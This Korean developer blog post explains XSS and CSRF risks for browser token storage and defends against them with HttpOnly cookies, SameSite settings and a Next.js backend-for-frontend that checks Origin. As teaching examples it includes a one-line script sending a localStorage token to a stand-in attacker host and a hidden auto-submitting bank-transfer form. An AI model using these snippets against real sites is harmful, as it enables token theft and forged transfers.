## 🪄 개발자 도구를 열면 토큰이 보인다

로그인 API에서 받은 access token을 `localStorage`에 넣고, 요청마다 `Authorization` 헤더에 붙인다. CSR 앱에서 가장 흔하게 쓰는 방식이다.

```ts
localStorage.setItem("accessToken", accessToken);

fetch("/api/me", {
  headers: { Authorization: `Bearer ${localStorage.getItem("accessToken")}` },
});
```

<br/>
그런데 개발자 도구의 Application 탭을 열면 토큰이 그대로 보인다. 내 눈에 보인다는 건, 이 페이지에서 실행되는 **모든 JavaScript가 이 값을 읽을 수 있다**는 뜻이기도 하다.

---

## 💥 두 공격은 노리는 게 다르다

XSS와 CSRF는 함께 언급되지만 공격자가 손에 넣는 것이 다르다.

| | XSS | CSRF |
| --- | --- | --- |
| 공격 코드가 실행되는 곳 | **우리 사이트** 안 | **공격자 사이트** |
| 공격자가 하는 일 | 토큰을 읽거나, 우리 사이트에서 직접 요청을 보냄 | 브라우저가 쿠키를 자동으로 붙이는 점을 이용해 요청만 보냄 |
| 응답을 읽을 수 있나 | 읽을 수 있음 | 읽을 수 없음 (CORS가 막음) |
| 약한 저장 방식 | JS가 읽을 수 있는 곳 (`localStorage`, 일반 쿠키) | 자동 전송되는 곳 (쿠키) |

<br/>

**XSS**는 공격자의 스크립트가 우리 사이트의 출처(origin)로 실행되는 공격이다. 댓글이나 프로필에 심은 스크립트, 오염된 서드파티 스크립트, `dangerouslySetInnerHTML`로 넣은 HTML이 통로가 된다. React는 기본적으로 문자열을 escape하지만, `href="javascript:..."`나 서드파티 스크립트까지 막아 주지는 않는다.

```js
// 공격자가 심은 스크립트 한 줄이면 토큰이 밖으로 나간다
fetch("https://attacker.example/steal?t=" + localStorage.getItem("accessToken"));
```
<br/>

**CSRF**는 공격자가 자기 사이트에 폼이나 요청을 숨겨 두고, 피해자의 브라우저가 우리 사이트 쿠키를 붙여서 대신 보내게 만드는 공격이다. 공격자는 응답을 볼 수 없지만, 송금이나 비밀번호 변경처럼 **요청이 도착하기만 해도 피해가 생기는 작업**이면 충분하다.

```html
<!-- attacker.example 페이지 -->
<form action="https://bank.example/transfer" method="POST">
  <input type="hidden" name="to" value="attacker" />
  <input type="hidden" name="amount" value="1000000" />
</form>
<script>document.forms[0].submit();</script>
```

> CORS는 다른 출처의 응답을 **읽는 것**을 막을 뿐, 요청이 **서버에 도착하는 것**을 막지 않는다. 위 폼 전송은 preflight 없이 그대로 서버에 도착한다.

---

## 🔍 "JWT라서 CSRF에 안전하다"는 반만 맞다

흔히 "세션은 CSRF에 약하고 JWT는 안전하다"고 정리한다. 그런데 CSRF 방어를 결정하는 건 **토큰의 형식이 아니라 전송 방식**이다.

- JWT를 `Authorization` 헤더에 직접 넣으면 → 브라우저가 자동으로 붙이지 않으니 CSRF에 안전하다.
- 같은 JWT를 **쿠키**에 넣으면 → 세션 ID와 똑같이 자동 전송되니 CSRF에 노출된다.

그래서 "XSS를 피하려고 HttpOnly 쿠키로 옮겼다"는 건 곧 **CSRF 방어가 다시 필요해졌다**는 뜻이다. 아래 방어책들이 하나씩 쌓이는 이유가 여기에 있다.

---

## 🔧 방어 1: HttpOnly 쿠키

`HttpOnly`가 붙은 쿠키는 `document.cookie`로 읽을 수 없다. 앞의 "토큰을 밖으로 보내는 한 줄"이 더 이상 동작하지 않는다.

```http
Set-Cookie: access_token=eyJ...; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=900
```
<br/>

**못 막는 것: XSS 자체**

토큰을 훔칠 수 없을 뿐, 공격 스크립트는 여전히 우리 사이트에서 실행된다. 같은 출처에서 `fetch("/api/transfer", { method: "POST" })`를 호출하면 브라우저는 HttpOnly 쿠키를 알아서 붙여 준다.

차이는 피해가 이어지는 시간이다. 토큰을 훔치면 공격자는 만료될 때까지 어디서든 그 토큰을 쓸 수 있지만, HttpOnly 쿠키라면 **피해자가 그 페이지를 열어 둔 동안에만** 공격할 수 있다. HttpOnly는 XSS를 막는다기보다 **XSS의 피해 범위를 줄이는** 장치다. XSS 자체는 CSP와 입력 escape로 따로 막아야 한다.

---

## 🔧 방어 2: SameSite

`SameSite`는 다른 사이트에서 시작된 요청에 쿠키를 붙일지 정한다.

| 값 | 다른 사이트에서 온 요청 | 비고 |
| --- | --- | --- |
| `Strict` | 절대 안 붙임 | 외부 링크로 들어와도 로그인이 풀린 것처럼 보임 |
| `Lax` | 링크 클릭 같은 **최상위 GET 이동**에만 붙임 | 지정하지 않으면 Chrome은 이 값으로 취급 |
| `None` | 항상 붙임 | `Secure` 필수 |

`Lax`만으로 앞의 숨은 폼 POST는 막힌다. 다만 기준이 되는 **"사이트"가 생각보다 넓다**는 점은 알아 둬야 한다.

<br/>
**same-site ≠ same-origin**

- **origin**: 스킴 + 호스트 + 포트 (`https://app.example.com:443`)
- **site**: 스킴 + 등록 가능한 도메인 (`https://example.com`)

`app.example.com`과 `blog.example.com`은 출처는 다르지만 **같은 사이트**다. 그래서 형제 서브도메인 중 하나에 XSS가 있거나, 사용자가 콘텐츠를 올릴 수 있는 서브도메인이 있다면 SameSite는 그 요청을 막지 못한다.

반대로 프론트가 `my-app.vercel.app`, API가 `api.my-service.com`이면 둘은 **다른 사이트**다. 쿠키를 주고받으려면 `SameSite=None`을 써야 하고, 그러면 SameSite의 CSRF 방어가 사라진다. BFF가 필요해지는 지점이다.

---

## 🔧 방어 3: 같은 사이트의 BFF

BFF(Backend for Frontend)는 프론트엔드 전용 서버 계층이다. Next.js라면 Route Handler가 이 역할을 한다.

```
[브라우저] ──(HttpOnly 쿠키, 같은 출처)──▶ [Next.js BFF] ──(Authorization: Bearer)──▶ [API 서버]
```

- 브라우저는 **Next.js와만** 통신한다. 쿠키는 같은 출처로만 오가므로 `SameSite=Lax`를 유지할 수 있다.
- 토큰은 BFF가 쿠키에서 꺼내 헤더로 바꿔 끼운다. 브라우저의 JavaScript는 토큰을 볼 일이 없다.
- API 서버는 여전히 Bearer 토큰만 받으면 된다. 백엔드 코드를 바꿀 필요가 없다.

<br/>
**로그인: 토큰을 HttpOnly 쿠키로 심기**

```ts
// app/api/auth/login/route.ts
import { cookies } from "next/headers";

export async function POST(req: Request) {
  const res = await fetch(`${process.env.API_URL}/auth/login`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: await req.text(),
  });

  if (!res.ok) {
    return Response.json({ message: "로그인에 실패했습니다." }, { status: res.status });
  }

  const { accessToken } = await res.json();

  const cookieStore = await cookies(); // Next 15부터 비동기
  cookieStore.set("access_token", accessToken, {
    httpOnly: true,
    secure: true,
    sameSite: "lax",
    path: "/",
    maxAge: 60 * 15,
  });

  // 토큰은 응답 본문에 담지 않는다
  return Response.json({ ok: true });
}
```

<br/>
**요청 전달: 쿠키를 헤더로 바꿔서 백엔드로**

```ts
// app/api/bff/[...path]/route.ts
import { cookies } from "next/headers";

async function forward(req: Request, { params }: { params: Promise<{ path: string[] }> }) {
  // 상태를 바꾸는 요청은 Origin을 직접 확인한다 (아래 설명 참고)
  if (req.method !== "GET" && req.headers.get("origin") !== process.env.APP_ORIGIN) {
    return Response.json({ message: "허용되지 않은 출처입니다." }, { status: 403 });
  }

  const token = (await cookies()).get("access_token")?.value;
  if (!token) {
    return Response.json({ message: "로그인이 필요합니다." }, { status: 401 });
  }

  const { path } = await params;
  const { search } = new URL(req.url);

  const res = await fetch(`${process.env.API_URL}/${path.join("/")}${search}`, {
    method: req.method,
    headers: {
      Authorization: `Bearer ${token}`,
      "Content-Type": req.headers.get("content-type") ?? "application/json",
    },
    body: req.method === "GET" || req.method === "HEAD" ? undefined : await req.arrayBuffer(),
  });

  return new Response(res.body, {
    status: res.status,
    headers: { "Content-Type": res.headers.get("content-type") ?? "application/json" },
  });
}

export { forward as GET, forward as POST, forward as PUT, forward as PATCH, forward as DELETE };
```

<br/>
클라이언트 코드는 토큰을 전혀 다루지 않게 된다.

```ts
// 토큰을 꺼내거나 헤더를 붙이는 코드가 사라졌다
const me = await fetch("/api/bff/users/me").then((r) => r.json());
```

<br/>
**Server Action과 Route Handler의 차이**

Next.js의 Server Action은 요청의 `Origin` 헤더와 `Host` 헤더를 비교해서, 다른 출처에서 온 호출을 기본으로 거부한다. **Route Handler에는 이런 검사가 없다.** 그래서 위 코드처럼 상태를 바꾸는 요청에는 `Origin`을 직접 확인했다. SameSite가 1차 방어라면 이 검사는 SameSite가 놓치는 경우(오래된 브라우저, 형제 서브도메인)를 막는 2차 방어다.

## 🤔 트레이드오프

**BFF가 해결하지 못하는 것**

- **XSS**: 앞에서 본 것처럼, 공격 스크립트가 `/api/bff/...`를 호출하면 BFF는 정상 요청과 구분할 수 없다. BFF는 토큰 유출을 막을 뿐이다.
- **GET 요청의 부작용**: `SameSite=Lax`는 최상위 GET 이동에 쿠키를 붙인다. GET으로 데이터를 바꾸는 API가 있다면 여전히 위험하다.

<br/>
**새로 생기는 비용**

- **요청 한 번이 더 거쳐 간다.** 브라우저 → BFF → API로 경로가 길어지고, BFF와 API 서버가 멀리 떨어져 있으면 지연이 그만큼 늘어난다.
- **서버 런타임이 필요하다.** `output: "export"` 같은 정적 배포로는 BFF를 둘 수 없다. 모든 API 트래픽을 Next.js 서버가 받으니 서버 부담도 함께 커진다.
- **토큰 갱신을 BFF가 맡아야 한다.** access token이 만료되면 BFF가 refresh token 쿠키로 새 토큰을 받아 쿠키를 갱신해야 한다. 동시에 여러 요청이 401을 받으면 갱신이 중복되지 않도록 처리하는 것도 BFF의 몫이 된다.

---

## 📌 정리

- XSS는 **우리 사이트 안에서** 실행되는 공격이고, CSRF는 **자동으로 붙는 쿠키**를 이용하는 공격이다. 노리는 게 다르니 방어책도 다르다.
- CSRF에 안전한지는 토큰 형식(JWT냐 세션이냐)이 아니라 **브라우저가 토큰을 자동으로 보내느냐**로 결정된다.
- HttpOnly는 XSS를 막는 게 아니라 **토큰 유출을 막아 피해 범위를 줄인다.** XSS 자체는 CSP와 escape로 막아야 한다.
- SameSite의 기준은 origin이 아니라 **site**다. 프론트와 API의 사이트가 다르면 SameSite 방어를 쓸 수 없고, 같은 사이트의 BFF가 이 문제를 풀어 준다.
- Next.js Route Handler로 BFF를 만들 때는 Server Action과 달리 **Origin 검사를 직접** 넣어야 한다.
